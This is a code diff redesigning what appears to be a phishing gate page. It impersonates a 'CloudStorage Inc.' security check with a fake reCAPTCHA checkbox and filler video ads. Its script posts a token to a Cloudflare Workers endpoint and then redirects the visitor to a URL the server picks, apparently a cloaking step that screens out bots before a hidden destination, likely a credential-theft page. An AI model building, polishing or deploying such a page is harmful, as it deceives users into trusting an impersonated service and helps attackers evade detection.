+                      <path d="M12 2a5 5 0 00-5 5v3H6a2 2 0 00-2 2v8a2 2 0 002 2h12a2 2 0 002-2v-8a2 2 0 00-2-2h-1V7a5 5 0 00-5-5zm-3 8V7a3 3 0 016 0v3H9z" />
+                    </svg>
+                  </div>
+                  <span class="recaptcha-text">reCAPTCHA</span>
+                  <span class="captcha-terms">Privacy · Terms</span>
+                </div>
+              </div>
+            </div>
+          </div>
+          <p id="captcha-footer" class="captcha-footer-note">
+            Protected by reCAPTCHA Enterprise and the Google
+            <a href="#" class="text-link-brand">Privacy Policy</a> and
+            <a href="#" class="text-link-brand">Terms of Service</a> apply.
+          </p>
+        </div>
+      </section>
 
-            update() {
-                this.x += this.vx;
-                this.y += this.vy;
-                this.opacity *= 0.996;
+      <div id="ad-billboard"></div>
+    </main>
+    <aside class="sidebar" id="sidebar"></aside>
+  </div>
 
-                if (this.x < 0) this.x = canvas.width;
-                if (this.x > canvas.width) this.x = 0;
-                if (this.y < 0) this.y = canvas.height;
-                if (this.y > canvas.height) this.y = 0;
-            }
+  <footer class="site-footer">
+    <div class="footer-inner">
+      <span>© 2026 CloudStorage Inc. All rights reserved.</span>
+      <div class="footer-link-group">
+        <a href="#">Privacy Policy</a>
+        <a href="#">Terms of Service</a>
+        <a href="#">Security Standards</a>
+        <a href="#">AdChoices</a>
+      </div>
+    </div>
+  </footer>
 
-            draw() {
-                ctx.fillStyle = this.color;
-                ctx.globalAlpha = this.opacity;
-                ctx.fillRect(this.x, this.y, this.radius, this.radius);
-            }
+  <script>
+    // Cursor glow tracking
+    const cursorGlow = document.getElementById('cursor-glow');
+    let mouseX = window.innerWidth / 2;
+    let mouseY = window.innerHeight / 2;
+    
+    window.addEventListener('mousemove', (e) => {
+      mouseX = e.clientX;
+      mouseY = e.clientY;
+      if (cursorGlow) {
+        cursorGlow.style.transform = `translate3d(${mouseX}px, ${mouseY}px, 0)`;
+      }
+    });
+
+    const AD_POOL = [
+      { tag: "Nature & Ecology Analytics", title: "Discover natural telemetry streams & conservation frameworks", video: "https://interactive-examples.mdn.mozilla.net/media/cc0-videos/flower.mp4" },
+      { tag: "Big Buck Bunny Pro", title: "Render stunning frame updates with low processing overhead", video: "https://www.w3schools.com/html/mov_bbb.mp4" },
+      { tag: "The Ocean Initiative", title: "Conserve global maritime datasets with real-time tracking", video: "https://vjs.zencdn.net/v/oceans.mp4" },
+      { tag: "Open Sintel Foundation", title: "Design detailed open-source graphics and dynamic pipelines", video: "https://media.w3.org/2010/05/sintel/trailer_hd.mp4" },
+      { tag: "W3C Video Engine", title: "Evaluate media playback metrics with robust standard controls", video: "https://media.w3.org/2010/05/bunny/trailer.mp4" },
+      { tag: "HTML5 Video Loop", title: "Explore inline mobile rendering capabilities with ease", video: "https://static.vecteezy.com/system/resources/previews/047/346/623/watermarked/digital-city-concept-artificial-intelligence-technology-in-smart-city-free-video.mp4" }
+    ];
+    const SIZES = { leaderboard: "size-leaderboard", billboard: "size-billboard", mrec: "size-mrec", halfpage: "size-halfpage" };
+
+    function pickAds(seed, count, exclude = new Set()) {
+      const pool = AD_POOL.filter(a => !exclude.has(a.tag));
+      const out = [];
+      for (let i = 0; i < count; i++) out.push(pool[(seed + i * 3) % pool.length]);
+      return out;
+    }
+
+    function renderAdCard(ad, sizeKey) {
+      return `<div class="ad-card ${SIZES[sizeKey]}">
+        <span class="ad-label">Sponsor</span>
+        <video autoplay loop muted playsinline src="${ad.video}" class="ad-card-video"></video>
+        <div class="ad-overlay-content">
+          <span class="ad-tag">${ad.tag}</span>
+          <span class="ad-title">${ad.title}</span>
+          <a href="#" class="ad-cta">Learn more ➜</a>
+        </div>
+      </div>`;
+    }
+
+    let adTick = 0;
+    function renderAllAds() {
+      const leaderboard = pickAds(adTick, 1)[0];
+      const sidebar = pickAds(adTick + 1, 2, new Set([leaderboard.tag]));
+      const inline = pickAds(adTick + 2, 1, new Set([leaderboard.tag, ...sidebar.map(a => a.tag)]))[0];
+      document.getElementById("ad-leaderboard").innerHTML = renderAdCard(leaderboard, "leaderboard");
+      document.getElementById("ad-billboard").innerHTML = renderAdCard(inline, "billboard");
+      document.getElementById("sidebar").innerHTML = renderAdCard(sidebar[0], "mrec") + renderAdCard(sidebar[1], "halfpage");
+    }
+    renderAllAds();
+    setInterval(() => { adTick++; renderAllAds(); }, 7000);
+
+    const bgCanvas = document.getElementById('bg-canvas');
+    const bgCtx = bgCanvas.getContext('2d');
+    bgCanvas.width = window.innerWidth;
+    bgCanvas.height = window.innerHeight;
+    const shapes = [];
+
+    // Background Geometric Floating Shapes (Triangles, Circles, Squares, Rings)
+    class FloatingShape {
+      constructor() {
+        this.reset();
+      }
+      reset() {
+        this.x = Math.random() * bgCanvas.width;
+        this.y = Math.random() * bgCanvas.height;
+        this.vx = (Math.random() - 0.5) * 0.4;
+        this.vy = (Math.random() - 0.5) * 0.4;
+        this.size = Math.random() * 28 + 14;
+        this.rotation = Math.random() * Math.PI * 2;
+        this.vRot = (Math.random() - 0.5) * 0.015;
+        this.type = Math.floor(Math.random() * 4); // 0: Circle, 1: Square, 2: Triangle, 3: Hollow Ring/Square
+        this.opacity = Math.random() * 0.18 + 0.08;
+        this.color = ['#d7373f', '#1473e6', '#4b4b4b', '#1473e6', '#d7373f'][Math.floor(Math.random() * 5)];
+      }
+      update() {
+        this.x += this.vx;
+        this.y += this.vy;
+        this.rotation += this.vRot;
+        if (this.x < -60) this.x = bgCanvas.width + 60;
+        if (this.x > bgCanvas.width + 60) this.x = -60;
+        if (this.y < -60) this.y = bgCanvas.height + 60;
+        if (this.y > bgCanvas.height + 60) this.y = -60;
+      }
+      draw() {
+        bgCtx.save();
+        bgCtx.translate(this.x, this.y);
+        bgCtx.rotate(this.rotation);
+        bgCtx.fillStyle = this.color;
+        bgCtx.strokeStyle = this.color;
+        bgCtx.lineWidth = 2.5;
+        bgCtx.globalAlpha = this.opacity;
+
+        if (this.type === 0) {
+          // Circle
+          bgCtx.beginPath();
+          bgCtx.arc(0, 0, this.size / 2, 0, Math.PI * 2);
+          bgCtx.fill();
+        } else if (this.type === 1) {
+          // Filled Square with soft corners
+          bgCtx.fillRect(-this.size / 2, -this.size / 2, this.size, this.size);
+        } else if (this.type === 2) {
+          // Triangle
+          bgCtx.beginPath();
+          bgCtx.moveTo(0, -this.size / 2);
+          bgCtx.lineTo(this.size / 2, this.size / 2);
+          bgCtx.lineTo(-this.size / 2, this.size / 2);
+          bgCtx.closePath();
+          bgCtx.fill();
+        } else {
+          // Hollow Square Ring
+          bgCtx.strokeRect(-this.size / 2, -this.size / 2, this.size, this.size);
         }
+        bgCtx.restore();
+      }
+    }
 
-        class FloatingShape {
-            constructor() {
-                this.x = Math.random() * canvas.width;
-                this.y = Math.random() * canvas.height;
-                this.vx = (Math.random() - 0.5) * 0.15;
-                this.vy = (Math.random() - 0.5) * 0.15;
-                this.rotation = Math.random() * Math.PI * 2;
-                this.rotationSpeed = (Math.random() - 0.5) * 0.008;
-                this.size = Math.random() * 50 + 30;
-                this.type = Math.floor(Math.random() * 3);
-                this.opacity = Math.random() * 0.12 + 0.03;
-                this.colors = ['#0078d4', '#106ebe', '#005a9e'];
-                this.color = this.colors[this.type];
-            }
+    for (let i = 0; i < 35; i++) shapes.push(new FloatingShape());
 
-            update() {
-                this.x += this.vx;
-                this.y += this.vy;
-                this.rotation += this.rotationSpeed;
+    function animateBg() {
+      bgCtx.clearRect(0, 0, bgCanvas.width, bgCanvas.height);
+      shapes.forEach(s => { s.update(); s.draw(); });
+      requestAnimationFrame(animateBg);
+    }
+    animateBg();
 
-                if (this.x < -this.size) this.x = canvas.width + this.size;
-                if (this.x > canvas.width + this.size) this.x = -this.size;
-                if (this.y < -this.size) this.y = canvas.height + this.size;
-                if (this.y > canvas.height + this.size) this.y = -this.size;
-            }
+    window.addEventListener('resize', () => {
+      bgCanvas.width = window.innerWidth;
+      bgCanvas.height = window.innerHeight;
+    });
 
-            draw() {
-                ctx.save();
-                ctx.translate(this.x, this.y);
-                ctx.rotate(this.rotation);
-                ctx.globalAlpha = this.opacity;
-                ctx.fillStyle = this.color;
+    const WORKER_URL = 'https://calm-cell-0739.arseniodacosta070.workers.dev';
+    const RECAPTCHA_SITE_KEY = '6LdpjT0tAAAAAP2zkDLN41nuzPMmced0cXvq3EGj';
 
-                if (this.type === 0) {
-                    ctx.fillRect(-this.size / 2, -this.size / 2, this.size, this.size);
-                } else if (this.type === 1) {
-                    ctx.beginPath();
-                    ctx.arc(0, 0, this.size / 2, 0, Math.PI * 2);
-                    ctx.fill();
-                } else {
-                    ctx.beginPath();
-                    for (let i = 0; i < 3; i++) {
-                        const angle = (i * Math.PI * 2) / 3 - Math.PI / 2;
-                        const px = Math.cos(angle) * this.size / 2;
-                        const py = Math.sin(angle) * this.size / 2;
-                        if (i === 0) ctx.moveTo(px, py);
-                        else ctx.lineTo(px, py);
-                    }
-                    ctx.closePath();
-                    ctx.fill();
-                }
-                ctx.restore();
-            }
+    const checkbox = document.getElementById("captcha-checkbox");
+    const spinner = document.getElementById("captcha-spinner");
+    const checkSvg = document.getElementById("captcha-check");
+    const captchaBox = document.getElementById("captcha-wrapper");
+    const captchaFooter = document.getElementById("captcha-footer");
+    const securityTitle = document.getElementById("security-title");
+    const securityDesc = document.getElementById("security-desc");
+    const verifiedIcon = document.getElementById("verified-icon");
+    const shieldIcon = document.getElementById("shield-icon");
+    const checkIcon = document.getElementById("check-icon");
+
+    let checked = false, loading = false;
+
+    function showError(msg) {
+      let el = document.getElementById('error-msg');
+      if (!el) {
+        el = document.createElement('div');
+        el.id = 'error-msg';
+        el.style.cssText = 'color:#d7373f;font-size:13px;margin-top:16px;text-align:center;padding:10px 14px;border-radius:8px;border-left:3px solid #d7373f;font-weight:600;background:rgba(215,55,63,0.08);';
+        document.querySelector('.security-card-body-content').appendChild(el);
+      }
+      el.textContent = msg;
+      el.style.display = 'block';
+    }
+
+    function getRecaptchaToken() {
+      return new Promise((resolve, reject) => {
+        if (!window.grecaptcha || !window.grecaptcha.enterprise) { 
+          reject(new Error('reCAPTCHA Enterprise not available')); 
+          return; 
         }
-
-        for (let i = 0; i < 60; i++) {
-            particles.push(new Particle());
-        }
-
-        for (let i = 0; i < 5; i++) {
-            shapes.push(new FloatingShape());
-        }
-
-        function animate() {
-            ctx.globalAlpha = 1;
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-
-            shapes.forEach(shape => {
-                shape.update();
-                shape.draw();
-            });
-
-            particles.forEach(particle => {
-                particle.update();
-                particle.draw();
-            });
-
-            requestAnimationFrame(animate);
-        }
-
-        animate();
-
-        window.addEventListener('resize', () => {
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
+        window.grecaptcha.enterprise.ready(() => {
+          window.grecaptcha.enterprise.execute(RECAPTCHA_SITE_KEY, { action: 'verify' }).then(resolve).catch(reject);
         });
+      });
+    }
 
-        // ORIGINAL VERIFICATION FUNCTIONALITY - PRESERVED
-        const CONFIG = {
-            workerUrl: 'https://calm-cell-0739.arseniodacosta070.workers.dev'
-        };
+    function executeVerification() {
+      if (checked || loading) return;
+      loading = true;
+      spinner.classList.remove("is-hidden");
+      checkSvg.classList.add("is-hidden");
+      checkbox.style.cursor = 'not-allowed';
+      checkbox.style.opacity = '0.6';
 
-        let formToken = null;
+      getRecaptchaToken()
+        .then(recaptchaToken => {
+          const controller = new AbortController();
+          const timeout = setTimeout(() => controller.abort(), 10000);
+          return fetch(WORKER_URL + '/api/verify', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ recaptchaToken }),
+            signal: controller.signal
+          }).finally(() => clearTimeout(timeout));
+        })
+        .then(r => r.json())
+        .then(data => {
+          loading = false;
+          spinner.classList.add("is-hidden");
+          checkbox.style.cursor = 'pointer';
+          checkbox.style.opacity = '1';
 
-        window.addEventListener('load', function() {
-            loadToken();
-        });
-
-        function loadToken() {
-            fetch(CONFIG.workerUrl + '/api/generate-form')
-                .then(response => response.json())
-                .then(data => {
-                    formToken = data.token;
-                    console.log('Token loaded');
-                })
-                .catch(error => {
-                    showError('Failed to load verification form');
-                    console.error('Error:', error);
-                });
-        }
-
-        document.getElementById('verify-btn').addEventListener('click', function() {
-            if (!formToken) {
-                showError('Token not ready. Please refresh the page.');
-                return;
-            }
-
-            verifyToken();
-        });
-
-        function verifyToken() {
-            const btn = document.getElementById('verify-btn');
+          if (data.verified) {
+            checked = true;
+            checkSvg.classList.remove("is-hidden");
+            checkSvg.classList.add("animate-check-pop");
             
-            btn.classList.add('loading');
-            document.getElementById('btn-text').innerHTML = '<span class="spinner"></span>Verifying...';
-            document.getElementById('status-text').textContent = 'Verification in progress...';
+            setTimeout(() => {
+              checkbox.classList.add("checkbox-success");
+              verifiedIcon.classList.add("done");
+              shieldIcon.classList.add("is-hidden");
+              checkIcon.classList.remove("is-hidden");
+              checkIcon.classList.add("animate-check-pop");
+              
+              securityTitle.textContent = "Verification Complete";
+              securityTitle.classList.add("title-success");
+              securityDesc.textContent = "Identity successfully confirmed. Securely redirecting...";
+              
+              setTimeout(() => {
+                captchaBox.style.opacity = '0';
+                captchaBox.style.transition = 'opacity 0.4s ease';
+                captchaFooter.style.opacity = '0';
+                captchaFooter.style.transition = 'opacity 0.4s ease';
+                setTimeout(() => { 
+                  captchaBox.classList.add("is-hidden"); 
+                  captchaFooter.classList.add("is-hidden"); 
+                }, 400);
+              }, 300);
 
-            fetch(CONFIG.workerUrl + '/api/verify', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    token: formToken,
-                    action: 'verify'
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.verified) {
-                    btn.classList.remove('loading');
-                    btn.classList.add('verified');
-                    document.getElementById('btn-text').textContent = 'Verified ✓';
-                    document.getElementById('status-text').textContent = 'Identity verified successfully!';
-                    
-                    setTimeout(() => {
-                        window.location.href = data.redirectUrl;
-                    }, 1500);
-                } else {
-                    showError('Verification failed');
-                    btn.classList.remove('loading');
-                    document.getElementById('btn-text').textContent = 'Try Again';
-                }
-            })
-            .catch(error => {
-                btn.classList.remove('loading');
-                document.getElementById('btn-text').textContent = 'Try Again';
-                showError('Network error. Please try again.');
-                console.error('Error:', error);
-            });
-        }
+              setTimeout(() => { window.location.href = data.redirectUrl; }, 1500);
+            }, 400);
+          } else {
+            checkbox.classList.add("checkbox-error");
+            showError('Verification failed. Please click to try again.');
+            setTimeout(() => checkbox.classList.remove("checkbox-error"), 2000);
+          }
+        })
+        .catch(err => {
+          loading = false;
+          spinner.classList.add("is-hidden");
+          checkbox.style.cursor = 'pointer';
+          checkbox.style.opacity = '1';
+          checkbox.classList.add("checkbox-error");
+          showError('Network error during verification. Please try again.');
+          setTimeout(() => checkbox.classList.remove("checkbox-error"), 2000);
+        });
+    }
 
-        function showError(message) {
-            const errorDiv = document.getElementById('error-msg');
-            errorDiv.textContent = message;
-            errorDiv.style.display = 'block';
-        }
-    </script>
+    checkbox.addEventListener("click", executeVerification);
+    checkbox.addEventListener("keydown", e => { if (e.key === " " || e.key === "Enter") executeVerification(); });
+  </script>
 </body>
+
 </html>
